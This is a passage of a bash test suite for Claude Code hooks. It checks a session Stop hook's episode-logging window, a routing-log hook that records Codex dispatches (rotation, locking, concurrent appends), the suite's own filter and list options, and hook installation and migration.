  old_iso=$(jq -rn 'now - 36000 | strftime("%Y-%m-%dT%H:%M:%S") | . + "+00:00"')
  printf '{"date":"%s","cwd":"%s","session_id":"","summary":"Old session summary."}\n' \
    "$old_iso" "$cwd" > "$episodes"

  payload="{\"cwd\":\"$cwd\",\"session_id\":\"new-real-session\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$episodes" 2>/dev/null || echo 0)
  rm -rf "$dir"

  if [[ "$status" == "0" && "$line_count" == "2" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s (expected 2)\n' "$name" "$status" "$line_count"
  fi
}

session_stop_skips_after_recent_memlog_empty_session_id
session_stop_appends_after_old_memlog_empty_session_id

cross_cmd_stop_skips_recent_fractional_iso() {
  # Verifies Stop hook skips when the most recent session_id="" entry has a
  # Python-style fractional ISO timestamp within the 4-hour session window.
  # Steps:
  #   1. Create episodes.jsonl with session_id="" entry dated now, fractional-offset format
  #   2. Run session stop hook with a real session_id
  #   3. Assert exit 0 and episodes.jsonl still has exactly 1 line (not appended)
  local name="cross-cmd/stop-skips-recent-fractional-iso"
  should_run "$name" || return 0
  local dir cwd episodes payload status line_count recent_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  recent_iso="$(date -u +%Y-%m-%dT%H:%M:%S).123456+00:00"
  printf '{"date":"%s","cwd":"%s","session_id":"","summary":"Recent fractional entry."}\n' \
    "$recent_iso" "$cwd" > "$episodes"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"real-session-frac\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$episodes" 2>/dev/null || echo 0)
  rm -rf "$dir"
  if [[ "$status" == "0" && "$line_count" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s (expected 1)\n' "$name" "$status" "$line_count"
  fi
}

cross_cmd_stop_appends_old_fractional_iso() {
  # Verifies Stop hook appends when the most recent session_id="" entry has a
  # Python-style fractional ISO timestamp outside the 4-hour session window.
  # Steps:
  #   1. Create episodes.jsonl with session_id="" entry dated 2020-01-01, fractional-offset format
  #   2. Run session stop hook with a new real session_id
  #   3. Assert exit 0 and episodes.jsonl has exactly 2 lines (new entry appended)
  local name="cross-cmd/stop-appends-old-fractional-iso"
  should_run "$name" || return 0
  local dir cwd episodes payload status line_count
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  printf '{"date":"2020-01-01T00:00:00.123456+00:00","cwd":"%s","session_id":"","summary":"Old fractional entry."}\n' \
    "$cwd" > "$episodes"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"new-real-session-frac\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$episodes" 2>/dev/null || echo 0)
  rm -rf "$dir"
  if [[ "$status" == "0" && "$line_count" == "2" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s (expected 2)\n' "$name" "$status" "$line_count"
  fi
}
cross_cmd_stop_skips_recent_fractional_iso
cross_cmd_stop_appends_old_fractional_iso

# =============================================================================
# meta: --filter and --list self-verification
# =============================================================================
$LIST || echo "== meta: filter and list behavior =="

meta_filter_runs_only_matching() {
  # Verifies --filter executes exactly the cases whose name contains the pattern
  # and exits 0; all other cases are skipped.
  # Steps:
  #   1. Invoke test-hooks.sh --filter with a pattern matching exactly one known case
  #   2. Assert the output reports exactly "1 passed, 0 failed"
  local name="meta/filter-runs-only-matching"
  should_run "$name" || return 0
  local out
  out=$(bash "$SCRIPT_DIR/test-hooks.sh" --filter "pm: Edit memory file" 2>&1)
  if [[ "$out" == *"1 passed, 0 failed"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — got: %q\n' "$name" "$out"
  fi
}

meta_list_exits_zero_with_count() {
  # Verifies --list exits 0 and emits at least 200 case name lines without
  # executing any test code (counters remain 0).
  # Steps:
  #   1. Invoke test-hooks.sh --list
  #   2. Assert exit status is 0
  #   3. Assert the printed line count exceeds 200 (confirming the full registry)
  local name="meta/list-exits-zero-with-count"
  should_run "$name" || return 0
  local out count status
  out=$(bash "$SCRIPT_DIR/test-hooks.sh" --list 2>&1)
  status=$?
  count=$(printf '%s\n' "$out" | wc -l)
  if [[ "$status" == "0" && "$count" -gt 200 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — status=%s count=%s\n' "$name" "$status" "$count"
  fi
}

meta_filter_no_match_exits_nonzero() {
  # Verifies --filter with a pattern that matches no cases exits nonzero
  # and emits a diagnostic message rather than silently reporting 0 passed.
  # Steps:
  #   1. Invoke test-hooks.sh --filter with a pattern known to match nothing
  #   2. Assert exit status is nonzero
  #   3. Assert stderr/stdout contains "no tests matched"
  local name="meta/filter-no-match-exits-nonzero"
  should_run "$name" || return 0
  local out status
  out=$(bash "$SCRIPT_DIR/test-hooks.sh" --filter "__no_such_case_xyz__" 2>&1) && status=$? || status=$?
  if [[ "$status" -ne 0 && "$out" == *"no tests matched"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — status=%s out=%q\n' "$name" "$status" "$out"
  fi
}

# =============================================================================
# hook-routing-log
# =============================================================================

make_routing_log() {
  local dir="$1"
  mkdir -p "$dir"
  cat > "$dir/routing_log.md" <<'EOF'
---
name: routing_log
type: log
---

| date | task | routed to | Q hit | second-thoughts |
|------|------|-----------|-------|-----------------|
| 2026-05-15 | fixture | Codex | Q1 | no |

<!-- routing-log:auto-block:start -->
<!-- routing-log:auto-block:end -->
EOF
}

routing_rows() {
  awk '/<!-- routing-log:auto-block:start -->/{in_block=1; next} /<!-- routing-log:auto-block:end -->/{in_block=0} in_block && /^\{/' "$1/routing_log.md"
}

routing_count() {
  routing_rows "$1" | grep -c '^{' 2>/dev/null || true
}

assert_routing_schema() {
  local name="$1" dir="$2"
  should_run "$name" || return 0
  if routing_rows "$dir" | jq -e 'keys == ["brief_file","goal_excerpt","kind","q_hit","second_thoughts","session_id","subagent_type","ts"] and (.kind | IN("bash-dispatch","agent-dispatch")) and has("subagent_type") and has("brief_file") and has("goal_excerpt") and has("q_hit") and has("second_thoughts")' >/dev/null; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (routing JSON schema mismatch)\n' "$name"
  fi
}

routing_hook_case() {
  local name="$1" payload="$2" expect_count="$3" jq_expr="$4"
  should_run "$name" || return 0
  local root mem before after
  root="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/routing.XXXXXX")"
  mem="$root/proj-routing-log/-home-screenleon-github-pm-dispatch/memory"
  make_routing_log "$mem"
  before="$(routing_count "$mem")"
  printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  after="$(routing_count "$mem")"
  if [[ "$((after - before))" == "$expect_count" ]] && { [[ -z "$jq_expr" ]] || routing_rows "$mem" | tail -n 1 | jq -e "$jq_expr" >/dev/null; }; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (before=%s after=%s expected_delta=%s)\n' "$name" "$before" "$after" "$expect_count"
  fi
}

# Behavior: Routing hook creates a minimal routing_log.md when the file is missing.
# Steps:
#   1. Prepare an empty memory directory and a valid Agent routing payload.
#   2. Trigger the routing hook with the payload.
#   3. Verify routing_log.md is created and contains one routing row.
routing_missing_file_case() {
  local name="routing: missing routing_log.md creates minimal file and appends"
  should_run "$name" || return 0
  local root mem payload
  root="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/routing-missing.XXXXXX")"
  mem="$root/memory"
  mkdir -p "$mem"
  payload='{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"s7","tool_name":"Agent","tool_input":{"subagent_type":"codex-executor"}}'
  printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  if [[ -f "$mem/routing_log.md" ]] && [[ "$(routing_count "$mem")" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
  fi
}

# Behavior: Routing hook audits an existing routing_log.md without an auto-block and leaves it unchanged.
# Steps:
#   1. Prepare a legacy routing_log.md without the auto-block marker.
#   2. Trigger the routing hook with a valid Agent routing payload.
#   3. Verify the file is byte-identical and the audit log reports the missing marker.
routing_missing_marker_case() {
  local name="routing: existing log without auto-block audits and leaves file unmodified"
  should_run "$name" || return 0
  local root mem before payload
  root="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/routing-nomarker.XXXXXX")"
  mem="$root/memory"
  mkdir -p "$mem"
  printf 'legacy only\n' > "$mem/routing_log.md"
  cp "$mem/routing_log.md" "$mem/routing_log.md.before"
  payload='{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"s8","tool_name":"Agent","tool_input":{"subagent_type":"codex-executor"}}'
  printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  if cmp -s "$mem/routing_log.md" "$mem/routing_log.md.before" && grep -Eq 'auto-block.*missing' "$CLAUDE_HOOK_LOG_DIR/routing-log.err"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
  fi
}

# Behavior: Routing hook rotates an over-cap routing_log.md while preserving header content and a fresh auto-block.
# Steps:
#   1. Prepare a routing_log.md larger than 1 MiB with an existing auto-block.
#   2. Trigger the routing hook with a valid Agent routing payload.
#   3. Verify the archive is created, the fresh log has one row, and the header remains.
routing_rotation_case() {
  local name="routing: rotates over 1MiB preserving header and fresh block"
  should_run "$name" || return 0
  local root mem payload
  root="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/routing-rotate.XXXXXX")"
  mem="$root/memory"
  make_routing_log "$mem"
  perl -0pi -e 's/<!-- routing-log:auto-block:start -->/"x" x 1049000 . "\n<!-- routing-log:auto-block:start -->"/e' "$mem/routing_log.md"
  payload='{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"r1","tool_name":"Agent","tool_input":{"subagent_type":"codex"}}'
  printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  if [[ -f "$mem/routing_log.md.1" ]] && [[ "$(routing_count "$mem")" == "1" ]] && grep -q '^| 2026-05-15 | fixture |' "$mem/routing_log.md"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
  fi
}

# Behavior: Routing hook audits rotation failures and skips appending.
# Steps:
#   1. Prepare an over-cap routing_log.md in a non-writable memory directory.
#   2. Trigger the routing hook with a valid Agent routing payload.
#   3. Verify the row count is unchanged and the audit log reports rotation failure.
routing_rotation_fail_case() {
  local name="routing: rotation failure audits and skips append"
  should_run "$name" || return 0
  local root mem payload before after
  root="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/routing-rotate-fail.XXXXXX")"
  mem="$root/memory"
  make_routing_log "$mem"
  perl -0pi -e 's/<!-- routing-log:auto-block:start -->/"x" x 1049000 . "\n<!-- routing-log:auto-block:start -->"/e' "$mem/routing_log.md"
  before="$(routing_count "$mem")"
  chmod 500 "$mem"
  payload='{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"r2","tool_name":"Agent","tool_input":{"subagent_type":"codex"}}'
  printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  chmod 700 "$mem"
  after="$(routing_count "$mem")"
  if [[ "$before" == "$after" ]] && grep -q 'rotation' "$CLAUDE_HOOK_LOG_DIR/routing-log.err"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
  fi
}

# Behavior: Routing hook serializes concurrent appends through the routing log lock.
# Steps:
#   1. Fire 50 parallel Agent routing payloads at one routing_log.md.
#   2. Verify exactly 50 JSON rows were appended and the auto-block markers remain intact.
#   3. Hold the sibling lockfile and verify lock timeout audits while the hook still exits zero.
routing_concurrent_append_case() {
  local name="routing: concurrent appends keep every row"
  should_run "$name" || return 0
  local root mem n payload status pid count unique start_count end_count json_ok lockbase lockfile lockdir ready lock_release holder timeout_status before_timeout after_timeout
  local pids=()
  root="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/routing-concurrent.XXXXXX")"
  mem="$root/memory"
  make_routing_log "$mem"
  n=50
  status=0

  for i in $(seq 1 "$n"); do
    payload="{\"cwd\":\"/home/screenleon/github/pm-dispatch\",\"session_id\":\"concurrent-$i\",\"tool_name\":\"Agent\",\"tool_input\":{\"subagent_type\":\"codex-executor\"}}"
    (
      printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
    ) &
    pids+=("$!")
  done
  for pid in "${pids[@]}"; do
    wait "$pid" || status=1
  done

  count="$(routing_count "$mem")"
  unique="$(routing_rows "$mem" | jq -r '.session_id' | sort -u | wc -l | tr -d '[:space:]')"
  start_count="$(grep -c -F '<!-- routing-log:auto-block:start -->' "$mem/routing_log.md" 2>/dev/null || true)"
  end_count="$(grep -c -F '<!-- routing-log:auto-block:end -->' "$mem/routing_log.md" 2>/dev/null || true)"
  json_ok=0
  routing_rows "$mem" | jq -c . >/dev/null && json_ok=1

  lockbase="$CLAUDE_HOOK_LOG_DIR/routing_log_append"
  lockfile="${lockbase}.lock"
  lockdir="${lockbase}.lockdir"
  ready="$root/lock-ready"
  lock_release="$root/lock-release"
  mkfifo "$lock_release"
  mkfifo "$ready"
  if command -v flock >/dev/null 2>&1 && [[ "${FAKE_FLOCK_MISSING:-}" != "1" ]]; then
    (
      (
        flock -x 9 || exit 1
        echo ok > "$ready"
        cat "$lock_release" >/dev/null
      ) 9>"$lockfile"
    ) &
  else
    (
      mkdir "$lockdir" || exit 1
      echo ok > "$ready"
      cat "$lock_release" >/dev/null
      rmdir "$lockdir"
    ) &
  fi
  holder="$!"
  IFS= read -r _ < "$ready" || true
  before_timeout="$(routing_count "$mem")"
  payload='{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"lock-timeout","tool_name":"Agent","tool_input":{"subagent_type":"codex-executor"}}'
  printf '%s' "$payload" | env CLAUDE_ROUTING_LOG_DIR="$mem" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  timeout_status=$?
  after_timeout="$(routing_count "$mem")"
  : > "$lock_release"
  wait "$holder" 2>/dev/null || true

  if [[ "$status" == "0" ]] &&
     [[ "$count" == "$n" ]] &&
     [[ "$unique" == "$n" ]] &&
     [[ "$json_ok" == "1" ]] &&
     [[ "$start_count" == "1" ]] &&
     [[ "$end_count" == "1" ]] &&
     [[ "$timeout_status" == "0" ]] &&
     [[ "$before_timeout" == "$after_timeout" ]] &&
     grep -q -F 'lock or append failed' "$CLAUDE_HOOK_LOG_DIR/routing-log.err"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (wait_status=%s count=%s unique=%s json_ok=%s start=%s end=%s timeout_status=%s before_timeout=%s after_timeout=%s)\n' \
      "$name" "$status" "$count" "$unique" "$json_ok" "$start_count" "$end_count" "$timeout_status" "$before_timeout" "$after_timeout"
  fi
}

# Behavior: routing hook appends first row when LOG_DIR does not exist yet (fresh HOME).
# Steps:
#   1. Create a temp HOME dir with no .claude/logs subdirectory.
#   2. Create a memory dir with a valid routing_log.md.
#   3. Run hook with CLAUDE_HOOK_LOG_DIR unset (hook defaults to $HOME/.claude/logs).
#   4. Assert routing_log.md contains exactly one JSON row.
routing_fresh_home_no_log_dir_case() {
  local name="routing: first row appended when LOG_DIR absent (fresh HOME)"
  should_run "$name" || return 0
  local tmp_home tmp_mem
  tmp_home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/fresh-home.XXXXXX")"
  tmp_mem="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/fresh-mem.XXXXXX")"
  make_routing_log "$tmp_mem"
  local payload='{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"fresh-home-test","tool_name":"Agent","tool_input":{"subagent_type":"codex-executor"}}'
  printf '%s' "$payload" \
    | env HOME="$tmp_home" CLAUDE_ROUTING_LOG_DIR="$tmp_mem" CLAUDE_HOOK_LOG_DIR= \
        "$SCRIPT_DIR/hook-routing-log.sh" >/dev/null 2>&1
  local count
  count="$(routing_count "$tmp_mem")"
  if [[ "$count" -eq 1 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (rows=%s expected=1)\n' "$name" "$count"
  fi
  rm -rf "$tmp_home" "$tmp_mem"
}

# Behavior: install-hooks dry-run shows PostToolUse Bash|Agent routing hook wiring.
# Steps:
#   1. Prepare an isolated HOME with empty Claude settings.
#   2. Trigger install-hooks with --dry-run.
#   3. Verify the diff contains PostToolUse Bash|Agent wiring for hook-routing-log.sh.
install_routing_dry_run_case() {
  local name="routing: install-hooks dry-run wires PostToolUse Bash|Agent"
  should_run "$name" || return 0
  local home out
  home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/install-routing.XXXXXX")"
  mkdir -p "$home/.claude"
  printf '{}\n' > "$home/.claude/settings.json"
  out="$(HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" --dry-run 2>&1)"
  if [[ "$out" == *'"PostToolUse"'* && "$out" == *'"matcher": "Bash|Agent"'* && "$out" == *'hook-routing-log.sh'* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
  fi
}

# Behavior: install-hooks exits cleanly when routing hook wiring is already present.
# Steps:
#   1. Prepare an isolated HOME and run install-hooks once.
#   2. Trigger install-hooks a second time.
#   3. Verify the second run reports already wired.
install_routing_idempotent_case() {
  local name="routing: install-hooks already-wired exits cleanly"
  should_run "$name" || return 0
  local home out
  home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/install-routing-idem.XXXXXX")"
  mkdir -p "$home/.claude"
  printf '{}\n' > "$home/.claude/settings.json"
  HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" >/dev/null 2>&1
  out="$(HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" 2>&1)"
  if [[ "$out" == *"install-hooks: already wired, nothing to do"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — out=%q\n' "$name" "$out"
  fi
}

routing_encode_path() {
  local cwd="$1" enc
  enc="-${cwd#/}"
  printf '%s' "${enc//\//-}"
}

install_routing_memory_dir() {
  local home="$1"
  printf '%s/.claude/projects/%s/memory' "$home" "$(routing_encode_path "$REPO_ROOT")"
}

write_install_routing_legacy_fixture() {
  local path="$1"
  mkdir -p "$(dirname "$path")"
  cat > "$path" <<'EOF'
---
name: routing_log
type: log
---
Append one row per Brief or Dispatch decision.

| date | task | routed to | Q hit | second-thoughts |
|------|------|-----------|-------|-----------------|
| 2026-05-15 | legacy alpha | Codex | Q1 | no |

## 2026-05-15 — one
- Task: apply exact patch one
- Routed to: Codex (executor)
- Q1/Q2/Q3 hit: Q1 yes
- Second thoughts: none
EOF
}

# Behavior: install-hooks migrates an unmarked routing_log.md before wiring routing hooks.
# Steps:
#   1. Prepare isolated Claude settings and a discoverable legacy routing_log.md.
#   2. Trigger install-hooks normally.
#   3. Verify settings wiring, auto-block migration, and routing_log.md backup creation.
install_routing_migrates_unmarked_case() {
  local name="install-routing: unmarked routing_log triggers migrator end-to-end" home mem out count
  should_run "$name" || return 0
  home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/install-routing-migrate.XXXXXX")"
  mkdir -p "$home/.claude"
  printf '{}\n' > "$home/.claude/settings.json"
  mem="$(install_routing_memory_dir "$home")"
  write_install_routing_legacy_fixture "$mem/routing_log.md"
  out="$(HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" 2>&1)"
  count="$(jq '[.hooks.PostToolUse[]? | select(.matcher == "Bash|Agent") | (.hooks // [])[]? | select((.command | split("/") | last) == "hook-routing-log.sh")] | length' "$home/.claude/settings.json")"
  if [[ "$count" == "1" ]] &&
     grep -q -F '<!-- routing-log:auto-block:start -->' "$mem/routing_log.md" &&
     [[ -f "$mem/routing_log.md.bak" ]] &&
     [[ "$out" == *"migrate-routing-log: migrated"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — out=%q count=%s marker=%s bak=%s\n' "$name" "$out" "$count" "$(grep -c -F '<!-- routing-log:auto-block:start -->' "$mem/routing_log.md" 2>/dev/null || true)" "$([[ -f "$mem/routing_log.md.bak" ]] && echo yes || echo no)"
  fi
}

# Behavior: install-hooks skips migrator when routing_log.md already contains the auto-block marker.
# Steps:
#   1. Prepare isolated Claude settings and an already migrated routing_log.md.
#   2. Trigger install-hooks normally.
#   3. Verify settings wiring, unchanged routing_log.md bytes, no new backup, and skip output.
install_routing_skips_already_migrated_case() {
  local name="install-routing: already-migrated routing_log skips migrator" home mem out count
  should_run "$name" || return 0
  home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/install-routing-skip.XXXXXX")"
  mkdir -p "$home/.claude"
  printf '{}\n' > "$home/.claude/settings.json"
  mem="$(install_routing_memory_dir "$home")"
  mkdir -p "$mem"
  make_routing_log "$mem"
  cp "$mem/routing_log.md" "$mem/routing_log.md.before"
  out="$(HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" 2>&1)"
  count="$(jq '[.hooks.PostToolUse[]? | select(.matcher == "Bash|Agent") | (.hooks // [])[]? | select((.command | split("/") | last) == "hook-routing-log.sh")] | length' "$home/.claude/settings.json")"
  if [[ "$count" == "1" ]] &&
     cmp -s "$mem/routing_log.md" "$mem/routing_log.md.before" &&
     [[ ! -e "$mem/routing_log.md.bak" ]] &&
     [[ "$out" == *"install-hooks: routing-log already migrated, skipping migrator"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — out=%q count=%s unchanged=%s bak=%s\n' "$name" "$out" "$count" "$(cmp -s "$mem/routing_log.md" "$mem/routing_log.md.before" && echo yes || echo no)" "$([[ -e "$mem/routing_log.md.bak" ]] && echo yes || echo no)"
  fi
}

# Behavior: install-hooks leaves settings.json untouched when routing-log migration fails.
# Steps:
#   1. Prepare isolated Claude settings, a legacy routing_log.md, and a conflicting .bak file.
#   2. Trigger install-hooks normally.
#   3. Verify non-zero exit, unchanged settings and routing log, no settings backup, and migrator failure output.
install_routing_migrator_failure_preserves_settings_case() {
  local name="install-routing: migrator failure leaves settings.json untouched" home mem out status backups
  should_run "$name" || return 0
  home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/install-routing-fail.XXXXXX")"
  mkdir -p "$home/.claude"
  printf '{"hooks":{"PreToolUse":[]}}\n' > "$home/.claude/settings.json"
  cp "$home/.claude/settings.json" "$home/.claude/settings.json.before"
  mem="$(install_routing_memory_dir "$home")"
  write_install_routing_legacy_fixture "$mem/routing_log.md"
  cp "$mem/routing_log.md" "$mem/routing_log.md.before"
  printf 'existing backup\n' > "$mem/routing_log.md.bak"
  out="$(HOME="$home" bash "$SCRIPT_DIR/install-hooks.sh" 2>&1)" && status=$? || status=$?
  backups="$(find "$home/.claude" -maxdepth 1 -name 'settings.json.bak.*' | wc -l)"
  if [[ "$status" -ne 0 ]] &&
     cmp -s "$home/.claude/settings.json" "$home/.claude/settings.json.before" &&
     cmp -s "$mem/routing_log.md" "$mem/routing_log.md.before" &&
     [[ "$backups" == "0" ]] &&
     [[ "$out" == *"migrate-routing-log:"* ]] &&
     [[ "$out" == *"install-hooks: routing-log migrator failed"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — status=%s backups=%s out=%q settings-unchanged=%s log-unchanged=%s\n' "$name" "$status" "$backups" "$out" "$(cmp -s "$home/.claude/settings.json" "$home/.claude/settings.json.before" && echo yes || echo no)" "$(cmp -s "$mem/routing_log.md" "$mem/routing_log.md.before" && echo yes || echo no)"
  fi
}

$LIST || echo "== hook-routing-log =="
ROUTING_BRIEF1="$(mktemp "$CLAUDE_HOOK_LOG_DIR/brief1.XXXXXX.md")"
ROUTING_BRIEF2="$(mktemp "$CLAUDE_HOOK_LOG_DIR/brief2.XXXXXX.md")"
printf 'goal:\n  first routing goal from brief\n' > "$ROUTING_BRIEF1"
printf 'goal: second routing goal from brief\n' > "$ROUTING_BRIEF2"
routing_hook_case "routing: Bash relative scripts/codex-dispatch with absolute brief" \
  "{\"cwd\":\"/home/screenleon/github/pm-dispatch\",\"session_id\":\"s1\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"scripts/codex-dispatch.sh --brief-file $ROUTING_BRIEF1\"}}" \
  1 ".kind == \"bash-dispatch\" and .subagent_type == null and .brief_file == \"$ROUTING_BRIEF1\" and .goal_excerpt == \"first routing goal from brief\""
routing_hook_case "routing: Bash absolute scripts/codex-dispatch with absolute brief" \
  "{\"cwd\":\"/home/screenleon/github/pm-dispatch\",\"session_id\":\"s2\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"/home/screenleon/github/pm-dispatch/scripts/codex-dispatch.sh --brief-file $ROUTING_BRIEF2\"}}" \
  1 ".kind == \"bash-dispatch\" and .brief_file == \"$ROUTING_BRIEF2\" and .goal_excerpt == \"second routing goal from brief\""
routing_hook_case "routing: Bash dispatch with relative brief writes null brief fields" \
  '{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"s3","tool_name":"Bash","tool_input":{"command":"scripts/codex-dispatch.sh --brief-file briefs/foo.md"}}' \
  1 '.kind == "bash-dispatch" and .brief_file == null and .goal_excerpt == null'
routing_hook_case "routing: Bash non-dispatch skips" \
  '{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"s4","tool_name":"Bash","tool_input":{"command":"ls /tmp"}}' \
  0 ""
routing_hook_case "routing: Agent codex-executor writes row" \
  '{"cwd":"/home/screenleon/github/pm-dispatch","session_id":"s5","tool_name":"Agent","tool_input":{"subagent_type":"codex-executor"}}' \
  1 '.kind == "agent-dispatch" and .subagent_type == "codex-executor" and .brief_file == null and .goal_excerpt == null'
